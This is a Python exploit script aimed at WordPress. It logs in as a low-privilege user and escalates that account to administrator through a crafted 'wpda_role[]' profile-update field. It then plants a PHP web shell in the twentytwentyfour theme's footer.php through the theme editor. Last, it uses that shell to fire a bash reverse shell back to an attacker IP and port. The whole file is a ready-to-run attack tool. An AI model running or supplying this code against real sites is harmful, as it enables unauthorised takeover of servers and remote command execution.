import requests
import sys
import re
from termcolor import colored
import signal

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
session = requests.Session()
session.verify = False
session.proxies = proxies

def print_banner():
    banner = colored("""

██╗   ██╗ ██████╗ ██╗   ██╗██╗      ██████╗ ███████╗███████╗
╚██╗ ██╔╝██╔═══██╗██║   ██║██║     ██╔═══██╗██╔════╝██╔════╝
 ╚████╔╝ ██║   ██║██║   ██║██║     ██║   ██║███████╗█████╗  
  ╚██╔╝  ██║   ██║██║   ██║██║     ██║   ██║╚════██║██╔══╝  
   ██║   ╚██████╔╝╚██████╔╝███████╗╚██████╔╝███████║███████╗  Version 1.0
   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚══════╝   
                                                            """)
    print(colored(banner, "blue"))
  


def exit_handler(sig, frame):
    print(colored("\n\n[-] Exisiting ... ", "yellow"))
    sys.exit(-1)

signal.signal(signal.SIGINT, exit_handler)


def login(username, password, ip):
    login_url = f"http://{ip}/wordpress/wp-login.php"
    data = {
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": f"http://{ip}/wordpress/wp-admin/",
        "testcookie": "1"
    }
    cookie = {
        "wordpress_test_cookie": "WP Cookie check",
        "wp_lang": "en_US"
    }
    try:
        response = session.post(login_url, data=data, cookies=cookie)
        if f"http://{ip}/wordpress/wp-admin/profile.php" in response.text or "Remind me later" in response.text:
            print(colored("[*] Successfully logged.", "green"))
            return True
        else:
            print(colored("[-] Failed to log in.", "red"))
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error occurred: {e}")
        return False

def wpnonce(response):
    pattern = r'name=["\']_wpnonce["\']\s+value=["\']([a-zA-Z0-9]+)["\']'
    match = re.findall(pattern, response)
    return match[0] if match else None

def nonce(response):
    pattern = r'name="nonce"\s+value="([a-zA-Z0-9]+)"'
    match = re.findall(pattern, response)
    return match[0] if match else None

def privilage_escalation(ip):
    privilage_escalation_url = f"http://{ip}/wordpress/wp-admin/profile.php"
    res = session.get(privilage_escalation_url)
    if not res.ok:
        print(colored("[-] Failed to fetch profile page.", "red"))
        return False

    nonce_value = wpnonce(res.text)
    if not nonce_value:
        print("[-] Failed to retrieve _wpnonce.")
        return False

    data = {
        "_wpnonce": nonce_value,
        "_wp_http_referer": "/wordpress/wp-admin/profile.php?updated=1",
        "from": "profile",
        "checkuser_id": "2",
        "color-nonce": "8beff9dd43",
        "admin_color": "fresh",
        "admin_bar_front": "1",
        "locale": "site-default",
        "first_name": "bob",
        "last_name": "bob",
        "nickname": "bob",
        "display_name": "bob bob",
        "email": "bob@localhost.com",
        "url": "",
        "description": "",
        "pass1": "",
        "pass2": "",
        "action": "update",
        "user_id": "2",
        "submit": "Update Profile",
        "wpda_role[]": "administrator",
    }

    try:
        response = session.post(privilage_escalation_url, data=data)
        if "Keyboard Shortcuts" in response.text or response.status_code == 302:
            print(colored("[*] Successfully gained privilege access.", "green"))
            return True
        else:
            print(colored("[-] Failed to escalate privilege.", "red"))
            return False
    except requests.exceptions.RequestException as e:
        print(coolored(f"Error occurred during privilege escalation: {e}", "red"))
        return False

def get_revshell(target_ip, attacker_ip, port, payload):
    execute_url = f"http://{target_ip}/wordpress/wp-content/themes/twentytwentyfour/patterns/footer.php?cmd=id"
    save_payload_url = f"http://{target_ip}/wordpress/wp-admin/admin-ajax.php"

    res = session.get(f"http://{target_ip}/wordpress/wp-admin/theme-editor.php?file=patterns%2Ffooter.php&theme=twentytwentyfour")
    if not res.ok:
        print(colored("[-] Failed to fetch theme editor page.", "red"))
        return False

    nonce_value = nonce(res.text)

    data = {
        'nonce': nonce_value,
        '_wp_http_referer': '/wordpress/wp-admin/theme-editor.php?file=patterns%2Ffooter.php&theme=twentytwentyfour',
        'newcontent': '<?php system($_GET["cmd"]); ?>',
        'action': 'edit-theme-plugin-file',
        'file': 'patterns/footer.php',
        'theme': 'twentytwentyfour',
        'docs-list': ''}

    try:
        res = session.post(save_payload_url, data=data)
        if not res.ok:
            print(colored("[-] Failed to save payload.", "red"))
            return False

        response = session.get(execute_url)
        print(colored(f"[*] EXecuting simple command: || --> \n\n{response.text}", "blue"))
        print(colored("[*] Please Chech your Listener ... ", "yellow"))
        if "uid=" in response.text:
            revshell_url = f"http://{target_ip}/wordpress/wp-content/themes/twentytwentyfour/patterns/footer.php?cmd={payload}"
            res = session.get(revshell_url)
            print(colored("[*] Successfully you got the shell.", "green"))
        else:
            print(colored("[-] Failed to execute command.", "red"))
    except requests.exceptions.RequestException as e:
        print(f"Error occurred during reverse shell execution: {e}")
        return False

def main():
    if len(sys.argv) != 11:
        print(colored(f"Example: \n\npython {sys.argv[0]} -target_ip <target ip address> -u <username> -p <password> -ip <attacker_ip> -port <port>", "yellow"))
        print(colored(f"\nUsage: \n\npython {sys.argv[0]} \n-target_ip <target ip address> \n-u <username> \n-p <password> -\n-ip <attacker_ip> \n-port <port>", "yellow"))
        sys.exit(-1)
    if sys.argv[1] != "-target_ip" or sys.argv[3] != "-u" or sys.argv[5] != "-p" or sys.argv[7] != "-ip" or sys.argv[9] != "-port":
        print(colored(f"Usage: \n\npython {sys.argv[0]} -target_ip <target ip address> -u <username> -p <password> -ip <attacker_ip> -port <port>", "yellow"))
        print(colored(f"\nUsage: \n\npython {sys.argv[0]} \n-target_ip <target ip address> \n-u <username> \n-p <password> -\n-ip <attacker_ip> \n-port <port>", "yellow"))


        sys.exit(-2)

    target_ip = sys.argv[2]
    username = sys.argv[4]
    password = sys.argv[6]
    attacker_ip = sys.argv[8]
    port = sys.argv[10]
    payload = f"bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/{attacker_ip}/{port}%200%3E%261%22"

    print(colored("\n[*] Process Starting ...", "green"))
    if login(username, password, target_ip):
        privilage_escalation(target_ip)
        get_revshell(target_ip, attacker_ip, port, payload)

if __name__ == "__main__":
    print_banner()
    main()